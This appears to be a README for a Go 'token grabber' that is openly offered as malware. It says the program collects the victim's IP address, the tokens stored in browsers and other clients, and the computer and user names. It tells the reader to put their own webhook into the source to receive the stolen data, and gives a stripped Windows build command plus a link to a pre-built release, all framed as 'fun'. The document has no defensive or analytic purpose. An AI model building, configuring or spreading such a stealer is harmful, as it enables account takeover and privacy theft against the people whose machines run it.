# Token Gorabber
## What is this?
This is a very simple token grabber written in Go that can grab:
- IP ADDRESS
- EVERY TOKEN FROM VARIOUS SOURCES LIKE BROWSER OR MANY CLIENTS
- COMPUTER'S NAME AND USER NAME
But just for now...

## How do i use it?
If you wanna get fun then you could follow those steps:
- Well, you could just simply download main.go
- Edit the file and replace THIS with your webhook

```
var(
    webhook = "THIS"
)
```
- then compile the gr4bber using
```
GOOS=windows go build -ldflags="-s -w" main.go
```
<b>There you go.</b>

Or if you prefer, you could just download <a href="#">pre-build release</a> and get fun ;).
